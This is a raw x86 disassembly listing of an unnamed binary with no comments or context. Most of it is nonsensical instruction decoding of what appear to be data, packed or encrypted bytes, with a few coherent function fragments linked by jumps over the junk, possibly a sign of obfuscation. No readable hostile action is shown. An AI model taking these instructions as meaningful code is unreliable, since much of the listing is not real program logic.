  4068e9:	sub    DWORD PTR [ebx],eax
  4068eb:	xchg   ecx,eax
  4068ec:	push   edx
  4068ed:	push   ss
  4068ee:	jp     0x406963
  4068f0:	cmp    eax,0x80b3d6c6
  4068f5:	inc    ebx
  4068f6:	std    
  4068f7:	or     ah,bh
  4068f9:	mov    esp,es
  4068fb:	mov    edi,0x6a502c3a
  406900:	pop    es
  406901:	sti    
  406902:	inc    ecx
  406903:	lods   eax,DWORD PTR ds:[esi]
  406904:	pop    edx
  406905:	add    dl,BYTE PTR [ebp-0x4998c359]
  40690b:	mov    ecx,eax
  40690d:	sub    al,0xde
  40690f:	mov    bl,0x84
  406911:	xchg   esp,eax
  406912:	cmp    DWORD PTR ds:0xce8bfef,0xffffff91
  406919:	mov    ebp,0x772eec0b
  40691e:	sbb    eax,0x49e6cd3e
  406923:	push   cs
  406924:	out    0x61,eax
  406926:	gs pop edi
  406928:	push   ds
  406929:	push   cs
  40692a:	ror    esi,cl
  40692c:	add    ecx,DWORD PTR [eax+0x1c4c8054]
  406932:	mov    WORD PTR [edx+0x27],?
  406935:	int    0xa3
  406937:	mov    ds:0xf8000ba8,al
  40693c:	jp     0x40691d
  40693e:	push   ss
  40693f:	and    BYTE PTR [edi+0x74],cl
  406942:	out    dx,eax
  406943:	push   eax
  406944:	dec    eax
  406945:	(bad)
  406949:	mov    eax,0x16cca093
  40694e:	int    0xcd
  406950:	shl    BYTE PTR [eax+0x700b5da3],0xba
  406957:	cmp    ah,BYTE PTR [edi+0x1a]
  40695a:	dec    ebx
  40695b:	popf   
  40695c:	aad    0xd1
  40695e:	(bad)  
  40695f:	adc    esp,DWORD PTR [ebx]
  406961:	push   ds
  406962:	mov    bl,0x6b
  406964:	adc    eax,DWORD PTR [eax]
  406966:	xchg   esi,eax
  406967:	and    eax,0xf2f8ce40
  40696c:	sbb    eax,0x5e7ef71c
  406971:	fadd   QWORD PTR [edi-0x5fc4429e]
  406977:	pop    edi
  406978:	sahf   
  406979:	pop    esp
  40697a:	jp     0x406961
  40697c:	push   ss
  40697d:	popa   
  40697e:	int3   
  40697f:	xor    BYTE PTR [eax-0x7b],ah
  406982:	cmp    al,0x7b
  406984:	cmp    al,0x4c
  406986:	lods   eax,DWORD PTR ds:[esi]
  406987:	cmp    DWORD PTR [esi-0xe],0x43
  40698b:	adc    DWORD PTR [eax-0x29],edx
  40698e:	dec    ebp
  40698f:	out    dx,eax
  406990:	mov    ch,0x8f
  406992:	xor    edx,DWORD PTR ds:0x985420ce
  406999:	call   0x806bfe22
  40699e:	js     0x40696a
  4069a0:	mov    edx,0x16277895
  4069a5:	das    
  4069a6:	retf   
  4069a7:	push   cs
  4069a8:	test   eax,0x48e3aab5
  4069ad:	xchg   ecx,eax
  4069ae:	xchg   edx,eax
  4069af:	or     al,0xc6
  4069b1:	lock xor eax,DWORD PTR [ebx-0x19281241]
  4069b8:	idiv   BYTE PTR [ebx]
  4069ba:	jl     0x406963
  4069bc:	lds    ebx,FWORD PTR [eax]
  4069be:	leave  
  4069bf:	xchg   edx,eax
  4069c0:	jl     0x406a2f
  4069c2:	sar    DWORD PTR [ecx],cl
  4069c4:	cmc    
  4069c5:	les    esp,FWORD PTR [ecx-0x409348bd]
  4069cb:	lods   al,BYTE PTR ds:[esi]
  4069cc:	fwait
  4069cd:	dec    esp
  4069ce:	or     eax,0x51553f57
  4069d3:	jmp    0x19ae2737
  4069d8:	call   0xae40:0x4755f18c
  4069df:	std    
  4069e0:	sbb    ah,BYTE PTR [esi]
  4069e2:	fnclex 
  4069e4:	test   al,0x11
  4069e6:	neg    BYTE PTR [eax+0x32b41513]
  4069ec:	out    dx,al
  4069ed:	aam    0x53
  4069ef:	stos   DWORD PTR es:[edi],eax
  4069f0:	mov    esp,0xa70ba825
  4069f5:	in     al,dx
  4069f6:	aas    
  4069f7:	push   esi
  4069f8:	cli    
  4069f9:	cmp    al,0x88
  4069fb:	test   DWORD PTR [esi+edx*1+0x48dfde84],edx
  406a02:	or     eax,0xc2906d23
  406a07:	and    eax,0x8a89aac4
  406a0c:	shr    BYTE PTR [ebp-0x6e2ad307],0x56
  406a13:	frstor [ebx-0x5dac02be]
  406a19:	mov    edx,0x9d3de4d7
  406a1e:	(bad)  
  406a20:	sub    dl,BYTE PTR gs:[eax-0x59a08a50]
  406a27:	retf   
  406a28:	test   DWORD PTR [edx],eax
  406a2a:	test   BYTE PTR [eax],0x68
  406a2d:	fild   DWORD PTR [esi+0x16d23bad]
  406a33:	clc    
  406a34:	add    BYTE PTR [edi-0xf],dh
  406a37:	call   0x7e54:0xd3ca06f9
  406a3e:	in     eax,0x5d
  406a40:	push   0x75
  406a42:	(bad)  
  406a43:	cwde   
  406a44:	mov    ebp,0x92e6be04
  406a49:	push   eax
  406a4a:	mov    eax,0x1a5f403d
  406a4f:	repnz in eax,0x40
  406a52:	xchg   edi,eax
  406a53:	pop    esi
  406a54:	sti    
  406a55:	ja     0x406acf
  406a57:	mov    ah,0x5
  406a59:	push   esi
  406a5a:	jecxz  0x406a7b
  406a5c:	push   esp
  406a5d:	call   0x46c2:0x688323c3
  406a64:	inc    eax
  406a65:	fmul   DWORD PTR [edx]
  406a67:	fwait
  406a68:	xchg   ebx,eax
  406a69:	out    dx,al
  406a6a:	adc    al,0x98
  406a6c:	pusha  
  406a6d:	mov    ch,0x17
  406a6f:	adc    edx,DWORD PTR [ebx]
  406a71:	cmp    eax,0x2a36aff1
  406a76:	ror    DWORD PTR [edi-0x6],cl
  406a79:	pop    ebx
  406a7a:	in     al,0xcb
  406a7c:	test   BYTE PTR [edi],0xe8
  406a7f:	aas    
  406a80:	scas   eax,DWORD PTR es:[edi]
  406a81:	xor    bl,BYTE PTR [ecx-0x463ecc9a]
  406a87:	add    BYTE PTR [ebx],bh
  406a89:	add    BYTE PTR [eax],al
  406a8b:	add    ax,cx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0xab80:0xd9dda5c
  406abc:	js     0x406b06
  406abe:	pusha  
  406abf:	sar    DWORD PTR [esp+edi*2+0x30],0x7e
  406ac4:	jl     0x406b42
  406ac6:	mov    dh,dh
  406ac8:	xor    al,0x47
  406aca:	mul    BYTE PTR [eax+0xec4c0ae]
  406ad0:	or     al,0xc3
  406ad2:	ds pop ecx
  406ad4:	enter  0x7f5,0x2c
  406ad8:	adc    esi,esi
  406ada:	push   cs
  406adb:	sbb    BYTE PTR [eax+esi*1],cl
  406ade:	aaa    
  406adf:	sub    al,0x8
  406ae1:	hlt    
  406ae2:	sbb    eax,0x99a0a0a5
  406ae7:	out    0xdf,eax
  406ae9:	pop    ss
  406aea:	jb     0x406b2b
  406aec:	js     0x406b3d
  406aee:	mov    esi,0xb019f14d
  406af3:	xchg   edi,eax
  406af4:	dec    ebp
  406af5:	mov    ds:0x2885d22d,eax
  406afa:	(bad)  
  406afb:	dec    esp
  406afc:	jne    0x8c1dfa90
  406b02:	sbb    al,BYTE PTR [ebx+eiz*2+0x4b]
  406b06:	or     DWORD PTR ds:0x9b662e0a,esp
  406b0c:	sbb    BYTE PTR [edi],0x1a
  406b0f:	lods   al,BYTE PTR ds:[esi]
  406b10:	add    DWORD PTR ds:0x1158e626,eax
  406b16:	fwait
  406b17:	sar    DWORD PTR [ebx],0x8d
  406b1a:	pusha  
  406b1b:	mov    eax,ds:0x10086093
  406b20:	test   DWORD PTR [edx],0x7cec9b87
  406b26:	sbb    ah,BYTE PTR [edx]
  406b28:	push   ebx
  406b29:	jge    0x406b02
  406b2b:	inc    ebx
  406b2c:	not    ebx
  406b2e:	jge    0x406af9
  406b30:	out    0x55,eax
  406b32:	inc    ebp
  406b33:	sub    ebp,esi
  406b35:	push   eax
  406b36:	jno    0x406b5e
  406b38:	pop    esp
  406b39:	fwait
  406b3a:	mov    esi,0x2cd8ebc5
  406b3f:	xchg   edx,eax
  406b40:	jmp    0xb221c53b
  406b45:	dec    ecx
  406b46:	push   ds
  406b47:	jmp    0xaad03b7a
  406b4c:	(bad)  [eax]
  406b4e:	add    BYTE PTR [eax+0x78],dh
  406b51:	nop
  406b52:	test   al,0xec
  406b54:	mov    bh,0xa6
  406b56:	xor    ch,BYTE PTR [ebp+0x6d]
  406b59:	push   eax
  406b5a:	fdivr  QWORD PTR [eax-0x7d6c9d1b]
  406b60:	call   0x71f1257e
  406b65:	rcl    DWORD PTR [eax-0x4b],1
  406b68:	mov    ecx,0xb8e18916
  406b6d:	mov    eax,DWORD PTR [ebx]
  406b6f:	sub    bl,BYTE PTR [esi+edx*4]
  406b72:	aad    0xa6
  406b74:	adc    BYTE PTR [ecx+0x5f9ed2d8],0x84
  406b7b:	push   es
  406b7c:	ins    DWORD PTR es:[edi],dx
  406b7d:	inc    ecx
  406b7e:	pop    ecx
  406b7f:	xchg   ebp,eax
  406b80:	movups XMMWORD PTR [eax+0x71],xmm5
  406b84:	(bad)  
  406b85:	xlat   BYTE PTR ds:[ebx]
  406b86:	adc    al,BYTE PTR [eax]
  406b88:	pop    ebx
  406b89:	fwait
  406b8a:	xor    BYTE PTR [ecx+0x695b98f6],bl
  406b90:	fsubr  DWORD PTR [ebp-0x50cebfa1]
  406b96:	sbb    dl,BYTE PTR ds:0x66633753
  406b9c:	and    BYTE PTR ds:0xd581fdbb,ah
  406ba2:	inc    edx
  406ba3:	cmp    ch,cl
  406ba5:	sti    
  406ba6:	push   cs
  406ba7:	ror    DWORD PTR [ecx-0x45],1
  406baa:	and    edx,edx
  406bac:	jmp    0x406c0a
  406bae:	sbb    DWORD PTR [ecx+0x6a],ebp
  406bb1:	sub    ch,ah
  406bb3:	adc    bh,BYTE PTR [edi-0x71]
  406bb6:	repz push 0x51
  406bb9:	adc    BYTE PTR [ecx+esi*4+0x2d6e7e1d],bl
  406bc0:	iret   
  406bc1:	rcl    ecx,1
  406bc3:	repz and BYTE PTR [edi],bl
  406bc6:	ins    DWORD PTR es:[edi],dx
  406bc7:	fild   QWORD PTR [esi-0x56]
  406bca:	mov    esp,0xc0d834a4
  406bcf:	dec    ebx
  406bd0:	xchg   esp,eax
  406bd1:	add    eax,0xb572ba20
  406bd6:	mov    ebp,0x22f5cb0c
  406bdb:	in     al,0x31
  406bdd:	xchg   edi,eax
  406bde:	inc    ecx
  406bdf:	mov    eax,ds:0xb8315f80
  406be4:	lds    edx,FWORD PTR [ebx+0x1efc848c]
  406bea:	fiadd  DWORD PTR [edi]
  406bec:	sub    al,0x78
  406bee:	retf   0x5673
  406bf1:	sbb    ah,ah
  406bf3:	cmp    eax,0x20088f76
  406bf8:	inc    edx
  406bf9:	jmp    0x406c4c
  406bfb:	addr16 jbe 0x406bcd
  406bfe:	lahf   
  406bff:	test   al,0x1a
  406c01:	dec    esp
  406c02:	push   esp
  406c03:	stos   BYTE PTR es:[edi],al
  406c04:	mov    ds:0xb3be37ae,al
  406c09:	pop    ebp
  406c0a:	stos   BYTE PTR es:[edi],al
  406c0b:	jmp    0x406c31
  406c0d:	inc    ecx
  406c0f:	ds xchg esi,eax
  406c11:	xlat   BYTE PTR ds:[ebx]
  406c12:	push   0xffffff94
  406c14:	sbb    ebx,DWORD PTR [eax]
  406c16:	mov    cl,0x76
  406c18:	sbb    dl,ch
  406c1a:	push   edx
  406c1b:	mov    bl,BYTE PTR [esi+0x19]
  406c1e:	sbb    esi,DWORD PTR [ebx-0x1c6811b7]
  406c24:	and    eax,0xc9d93808
  406c29:	pop    ebp
  406c2a:	xchg   ecx,eax
  406c2b:	enter  0x4c3,0xda
  406c2f:	and    edi,DWORD PTR [esi-0x4c]
  406c32:	shl    DWORD PTR [eax],1
  406c34:	ja     0x406c14
  406c36:	aad    0xf7
  406c38:	out    dx,al
  406c39:	add    eax,0xf421f889
  406c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c3f:	sbb    esp,DWORD PTR [esi]
  406c41:	ja     0x406c9a
  406c43:	mov    ah,0x42
  406c45:	iret   
  406c46:	out    0x1,al
  406c48:	pusha  
  406c49:	and    al,0x39
  406c4b:	call   0x90c6989
  406c50:	mov    dh,0x35
  406c52:	mov    esi,0x832163be
  406c57:	fistp  DWORD PTR [ecx+0x5c]
  406c5a:	rol    BYTE PTR [esi],1
  406c5c:	out    0x91,eax
  406c5e:	enter  0x28d7,0x3
  406c62:	sbb    ch,BYTE PTR [ebp+0x7cedac9a]
  406c68:	outs   dx,BYTE PTR ds:[esi]
  406c69:	jp     0x406c3c
  406c6b:	xchg   ebp,eax
  406c6c:	stc    
  406c6d:	(bad)  
  406c6e:	xlat   BYTE PTR ds:[ebx]
  406c6f:	jb     0x406c27
  406c71:	jg     0x406c70
  406c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c74:	jl     0x406c68
  406c76:	loope  0x406c73
  406c78:	sbb    esi,DWORD PTR ds:0x900a789c
  406c7e:	std    
  406c7f:	ins    DWORD PTR es:[edi],dx
  406c80:	pop    esi
  406c81:	call   0x5040f3fd
  406c86:	mov    esi,ebp
  406c88:	xchg   BYTE PTR [edi-0x40],bl
  406c8b:	in     eax,0x10
  406c8d:	loop   0x406cc1
  406c8f:	sbb    eax,0xbe6f4483
  406c94:	jge    0x406ca4
  406c96:	mov    ds:0xef54e154,al
  406c9b:	add    DWORD PTR [eax],ebx
  406c9d:	and    al,0xa0
  406c9f:	xlat   BYTE PTR ds:[ebx]
  406ca0:	pop    ebx
  406ca1:	mov    eax,0xcc1ea883
  406ca6:	mov    BYTE PTR [ebx+edi*8],bl
  406ca9:	mov    ebx,0xbd8d2d65
  406cae:	fidivr DWORD PTR [edx+edi*4+0x52]
  406cb2:	div    esi
  406cb4:	adc    esp,DWORD PTR [ebp+0x9a3e2f8]
  406cba:	mov    cl,dh
  406cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cbd:	out    dx,al
  406cbe:	gs aas 
  406cc0:	push   ds
  406cc1:	out    dx,eax
  406cc2:	sbb    BYTE PTR [edx+0x1d],cl
  406cc5:	jne    0x406d1d
  406cc7:	pop    ecx
  406cc8:	or     dh,bl
  406cca:	xchg   edx,eax
  406ccb:	dec    ebx
  406ccc:	fsubp  st(4),st
  406cce:	ss cdq 
  406cd0:	pop    DWORD PTR [eax-0x13e5f196]
  406cd6:	js     0x406d47
  406cd8:	aas    
  406cd9:	jae    0x406cb3
  406cdb:	rol    BYTE PTR [edi+0x421a7ba3],0xf6
  406ce2:	dec    esp
  406ce3:	mov    eax,ds:0x85690114
  406ce8:	lock sbb DWORD PTR [esi-0x521a22a2],esp
  406cef:	jb     0x406cf9
  406cf1:	or     BYTE PTR [eax+edx*1-0x5f],dl
  406cf5:	fimul  DWORD PTR [ecx+0x494de40]
  406cfb:	mov    al,ds:0x75280faa
  406d00:	(bad)  
  406d01:	popa   
  406d02:	mov    ax,WORD PTR [ebp-0x8]
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x4335ff
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43361b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43359b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x433543
  406d52:	or     DWORD PTR ds:0x43359f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x433557,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43361b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    ah,BYTE PTR ss:[esi]
  406d81:	jno    0x406dfd
  406d83:	pop    ss
  406d84:	and    al,0xc2
  406d86:	jl     0x406e04
  406d88:	xlat   BYTE PTR ds:[ebx]
  406d89:	jns    0x406e07
  406d8b:	jl     0x406d6b
  406d8d:	dec    ecx
  406d8e:	stc    
  406d8f:	test   al,0x18
  406d91:	loope  0x406de1
  406d93:	shr    DWORD PTR [edi-0x4c],1
  406d96:	fldenv [eax]
  406d98:	ins    BYTE PTR es:[edi],dx
  406d99:	sub    DWORD PTR ds:0xebe05b44,eax
  406d9f:	shl    BYTE PTR [ebp+0x2745cc1d],0x60
  406da6:	dec    ecx
  406da7:	iret   
  406da8:	imul   ebp,DWORD PTR [edx+0x5f],0xffffffb8
  406dac:	enter  0x1a97,0x0
  406db0:	adc    dl,bh
  406db2:	je     0x406de0
  406db4:	fidiv  WORD PTR [edi-0x4fc76ed6]
  406dba:	jecxz  0x406e23
  406dbc:	push   edx
  406dbd:	mov    dl,0xfc
  406dbf:	nop
  406dc0:	into   
  406dc1:	sbb    al,BYTE PTR [ecx+0xc]
  406dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dc5:	call   0x64dae5ce
  406dca:	test   al,0xaf
  406dcc:	repz mov ch,0x41
  406dcf:	xchg   ebp,eax
  406dd0:	shr    esi,1
  406dd2:	std    
  406dd3:	sbb    eax,0x34545115
  406dd8:	mov    ebp,0xd27f3f75
  406ddd:	ror    BYTE PTR [ecx-0x1318968b],0x80
  406de4:	daa    
  406de5:	xchg   edi,eax
  406de6:	loopne 0x406d75
  406de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406de9:	repz mov bh,0x87
  406dec:	inc    edx
  406ded:	jne    0x406e5d
  406def:	inc    esi
  406df0:	scas   eax,DWORD PTR es:[edi]
  406df1:	ror    BYTE PTR ds:0x94625672,1
  406df7:	sbb    BYTE PTR [esi+0x782486ca],bl
  406dfd:	mov    esp,0x1d0898cd
  406e02:	rol    BYTE PTR [esi-0xd664af2],0x8d
  406e09:	mov    edi,0x240121b9
  406e0e:	(bad)  
  406e0f:	or     eax,0xd0de94a5
  406e14:	frstor [edx-0x2661a1ed]
  406e1a:	das    
  406e1b:	add    bl,dh
  406e1d:	rcr    DWORD PTR ds:0x4ee21238,1
  406e23:	imul   edi,edx,0x53baff00
  406e29:	sbb    DWORD PTR [edx+esi*4-0x8ab62d2],edx
  406e30:	lods   al,BYTE PTR ds:[esi]
  406e31:	mov    eax,0xb77a847
  406e36:	test   al,0x37
  406e38:	mov    dl,0x9b
  406e3a:	cmc    
  406e3b:	lods   eax,DWORD PTR ds:[esi]
  406e3c:	outs   dx,DWORD PTR ds:[esi]
  406e3d:	mov    eax,ds:0x17f839c1
  406e42:	add    eax,eax
  406e44:	push   cs
  406e45:	retf   
  406e46:	js     0x406e3e
  406e48:	in     eax,0xfb
  406e4a:	(bad)  
  406e4b:	ja     0x406e3f
  406e4d:	adc    eax,0x339a98d3
  406e52:	std    
  406e53:	mov    edx,0x62dc69c7
  406e58:	push   eax
  406e59:	sbb    dh,ah
  406e5b:	rdmsr  
  406e5d:	les    ecx,FWORD PTR [edx]
  406e5f:	xor    bl,0xbc
  406e62:	pop    edx
  406e63:	lahf   
  406e64:	jno    0x406ebf
  406e66:	arpl   WORD PTR [esp+edi*1-0x4ba82c85],cx
  406e6d:	aaa    
  406e6e:	add    ah,bh
  406e70:	retf   0x41b4
  406e73:	add    BYTE PTR [edi],bl
  406e75:	movq   mm6,mm7
  406e78:	in     eax,dx
  406e79:	push   esp
  406e7a:	add    bl,BYTE PTR [ebp+0x52f33558]
  406e80:	mov    edi,0x61c2c9a1
  406e85:	sub    eax,0xa90fbf42
  406e8a:	call   0xa54d:0xf9f8a3fb
  406e91:	or     al,0x5d
  406e93:	popa   
  406e94:	sub    al,0x72
  406e96:	add    al,0x98
  406e98:	add    DWORD PTR ds:0xeea089f0,ebp
  406e9e:	sub    al,0x9
  406ea0:	test   al,0x41
  406ea2:	pushf  
  406ea3:	fstp   TBYTE PTR [edx-0x4c861529]
  406ea9:	dec    esi
  406eaa:	cmp    BYTE PTR [edi-0x32d61c3f],0xbc
  406eb1:	arpl   WORD PTR [edi+ebx*2-0x3a64fee5],bp
  406eb8:	pop    ebp
  406eb9:	inc    ecx
  406eba:	dec    eax
  406ebb:	in     eax,0x7a
  406ebd:	mov    esp,0x730a68c0
  406ec2:	out    dx,al
  406ec3:	dec    ebp
  406ec4:	in     eax,0x27
  406ec6:	mov    ch,0xec
  406ec8:	jl     0x406f0d
  406eca:	inc    edx
  406ecb:	push   eax
  406ecc:	jecxz  0x406ea4
  406ece:	or     eax,0xc973c991
  406ed3:	and    bl,BYTE PTR [eax]
  406ed5:	add    BYTE PTR [bx+si-0x2f],0xb0
  406eda:	pushf  
  406edb:	(bad)  
  406edc:	cld    
  406edd:	(bad)  
  406ede:	pop    ds
  406edf:	jmp    0xb40a3a86
  406ee4:	sub    bh,cl
  406ee6:	lods   al,BYTE PTR ds:[esi]
  406ee7:	ror    BYTE PTR [esi+ebx*1+0x1a],0x6
  406eec:	or     eax,0xc976f338
  406ef1:	enter  0x4bcd,0x15
  406ef5:	jecxz  0x406f73
  406ef7:	pop    ecx
  406ef8:	dec    edx
  406ef9:	adc    eax,0xf8753024
  406efe:	fistp  DWORD PTR [ebp+0x2b]
  406f01:	faddp  st(3),st
  406f03:	xlat   BYTE PTR ds:[ebx]
  406f04:	push   ds
  406f05:	or     DWORD PTR [ebx+0x4d736565],ebp
  406f0b:	jbe    0x406edd
  406f0d:	(bad)  
  406f0e:	loop   0x406eb5
  406f10:	dec    edi
  406f11:	sub    esi,DWORD PTR [ecx+ebx*8-0x78cbafc]
  406f18:	cmp    esp,ecx
  406f1a:	pop    esp
  406f1b:	retf   0x7ad4
  406f1e:	div    BYTE PTR ds:0xbed0ae81
  406f24:	sahf   
  406f25:	aaa    
  406f26:	cmc    
  406f27:	xor    BYTE PTR [ebp+0x4d],ch
  406f2a:	(bad)  
  406f2b:	xor    al,0xf5
  406f2d:	sahf   
  406f2e:	mov    ecx,ebx
  406f30:	lods   al,BYTE PTR ds:[esi]
  406f31:	retf   0xd540
  406f34:	dec    esp
  406f35:	add    BYTE PTR [edx-0x162e0d6e],ah
  406f3b:	push   ebx
  406f3c:	mov    bh,BYTE PTR [esi+0x6e]
  406f3f:	xor    DWORD PTR [eax+0x7f],esi
  406f42:	pop    ebx
  406f43:	mov    ds:0x83cc90af,eax
  406f48:	xchg   edi,eax
  406f49:	cld    
  406f4a:	(bad)  
  406f4b:	mov    bl,0x61
  406f4d:	sub    dl,ah
  406f4f:	jmp    0xb9fb80d6
  406f54:	sbb    bh,BYTE PTR [ebp+0x1c]
  406f57:	ds dec ebx
  406f59:	fiadd  WORD PTR [edi+eax*4+0x467b02ee]
  406f60:	neg    ebx
  406f62:	push   esi
  406f63:	sti    
  406f64:	sub    eax,0xf4d45ff7
  406f69:	mov    ah,0xd
  406f6b:	aas    
  406f6c:	jle    0x406f9b
  406f6e:	ins    BYTE PTR es:[edi],dx
  406f6f:	inc    eax
  406f70:	imul   edx,edi,0x74fc349f
  406f76:	test   al,0x3e
  406f78:	mov    cl,0x43
  406f7a:	xchg   ebx,eax
  406f7b:	fwait
  406f7c:	mov    DWORD PTR ds:0xec6515e6,edi
  406f82:	jns    0x406fdb
  406f84:	repnz or ebp,0xffffffdf
  406f88:	rcl    BYTE PTR [esi-0x7e],0x78
  406f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f8d:	mov    ebx,0xb1b56eda
  406f92:	mov    ds:0x10f91eed,al
  406f97:	xchg   esp,eax
  406f98:	fs std 
  406f9a:	xchg   BYTE PTR [ebx],bl
  406f9c:	pop    ebp
  406f9d:	fnsave [esi-0x36]
  406fa0:	or     DWORD PTR [ecx+ecx*2-0x5dbad4fe],ecx
  406fa7:	loop   0x407022
  406fa9:	sbb    BYTE PTR [ebx],ah
  406fab:	xor    ecx,DWORD PTR [esi+0x3cf57beb]
  406fb1:	hlt    
  406fb2:	stos   DWORD PTR es:[edi],eax
  406fb3:	mov    ds:0x5078da43,eax
  406fb8:	add    DWORD PTR [edi],esi
  406fba:	repz rcl BYTE PTR [ecx+0x322e6e5b],cl
  406fc1:	cmc    
  406fc2:	in     eax,0x66
  406fc4:	je     0x406f96
  406fc6:	jne    0x406f5a
  406fc8:	mov    eax,ds:0xee88abf4
  406fcd:	je     0x406fdc
  406fcf:	imul   edi,DWORD PTR [edx+0x6b],0x12
  406fd3:	out    0x21,al
  406fd5:	adc    eax,0x83e22f0a
  406fda:	xor    ebx,edx
  406fdc:	fcomip st,st(3)
  406fde:	cmp    edx,edx
  406fe0:	out    0xe6,eax
  406fe2:	or     esi,ebx
  406fe4:	jmp    0x406fb6
  406fe6:	mov    al,ds:0x8207983c
  406feb:	sahf   
  406fec:	cmp    BYTE PTR [esi-0x5dac3642],bl
  406ff2:	pop    ss
  406ff3:	push   es
  406ff4:	xchg   ecx,esi
  406ff6:	mov    ch,0x1e
  406ff8:	mov    dh,BYTE PTR [edi]
  406ffa:	pop    ss
  406ffb:	imul   esi,DWORD PTR [ebp+0x47d9950d],0xceafea30
  407005:	cmp    cl,BYTE PTR [esi+0x63e2d681]
  40700b:	shr    BYTE PTR [esi],0xef
  40700e:	call   0xbc71:0x246714f5
  407015:	das    
  407016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407017:	ret    
  407018:	xchg   ebp,eax
  407019:	lods   al,BYTE PTR ds:[esi]
  40701a:	mov    al,ds:0xdc7ca5fa
  40701f:	xchg   DWORD PTR [eax],ebx
  407021:	mov    ecx,0x1b5ed118
  407026:	push   ds
  407027:	mov    ds:0xae297746,eax
  40702c:	(bad)  
  40702d:	retf   
  40702e:	mov    al,ds:0x2d7b2a6b
  407033:	(bad)  
  407034:	fidiv  DWORD PTR [ebx]
  407036:	mov    ecx,0x282cbc4d
  40703b:	pop    edi
  40703c:	or     cl,0x93
  40703f:	mov    bh,dl
  407041:	inc    eax
  407042:	retf   
  407043:	lock cs add dh,cl
  407047:	aas    
  407048:	jle    0x406fe7
  40704a:	adc    eax,0x2d31fd05
  40704f:	sbb    cl,BYTE PTR [eax+0x17de9417]
  407055:	adc    DWORD PTR [edx+edx*8],ecx
  407058:	push   ebx
  407059:	cs xchg ebx,eax
  40705b:	cmp    eax,0x2ad2065f
  407060:	into   
  407061:	je     0x40707a
  407063:	(bad)  
  407064:	int3   
  407065:	jp     0x407004
  407067:	jmp    DWORD PTR [edx+0xe12adaa]
  40706d:	test   BYTE PTR [edi-0x39],0xc7
  407071:	jmp    FWORD PTR [edx+0x17157f2f]
  407077:	push   esi
  407078:	(bad)  
  407079:	outs   dx,BYTE PTR ds:[esi]
  40707a:	sub    al,bl
  40707c:	sar    DWORD PTR [ebx],cl
  40707e:	push   es
  40707f:	fisttp DWORD PTR [edx+0x5cfea9d3]
  407085:	mov    ah,bh
  407087:	pop    eax
  407088:	mov    ecx,0x182db35d
  40708d:	sbb    DWORD PTR [eax-0x52],esp
  407090:	lds    edx,FWORD PTR [ecx-0x55472b63]
  407096:	test   DWORD PTR [esi-0x400a36ee],0x35de1380
  4070a0:	mov    edi,0xa5b5847a
  4070a5:	adc    al,0xc2
  4070a7:	loopne 0x40708c
  4070a9:	je     0x40706c
  4070ab:	mov    al,ds:0x116a347b
  4070b0:	stos   DWORD PTR es:[edi],eax
  4070b1:	cmp    ebp,edx
  4070b3:	es push ecx
  4070b5:	xchg   BYTE PTR [eax-0x3629c20a],bl
  4070bb:	test   al,0xd1
  4070bd:	out    0x5d,eax
  4070bf:	hlt    
  4070c0:	imul   ebx,ebx,0x26
  4070c3:	pop    ebp
  4070c4:	add    eax,0x3e4840fe
  4070c9:	test   BYTE PTR [edx-0x26],cl
  4070cc:	adc    al,0xf9
  4070ce:	add    DWORD PTR [edi+0x2f7689af],0x17
  4070d5:	mov    ch,0x1a
  4070d7:	push   eax
  4070d8:	aam    0xea
  4070da:	mov    al,0x22
  4070dc:	js     0x407105
  4070de:	into   
  4070df:	or     eax,0xbbc5c900
  4070e4:	xor    al,0x89
  4070e6:	inc    ebp
  4070e7:	fadd   DWORD PTR [ecx+0x43354f25]
  4070ed:	add    BYTE PTR [ebp+0x27],cl
  4070f0:	add    BYTE PTR [eax],al
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x4335f3
  407100:	add    ecx,DWORD PTR ds:0x433543
  407106:	mov    DWORD PTR ds:0x4335f3,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	inc    esi
  40711e:	imul   eax,DWORD PTR [esp+eax*2+0x7c7ccfff],0xffffffd7
  407126:	jns    0x4071a4
  407128:	jl     0x40713f
  40712a:	adc    ebp,DWORD PTR [ecx+esi*2+0x77]
  40712e:	add    al,0xac
  407130:	jge    0x40712d
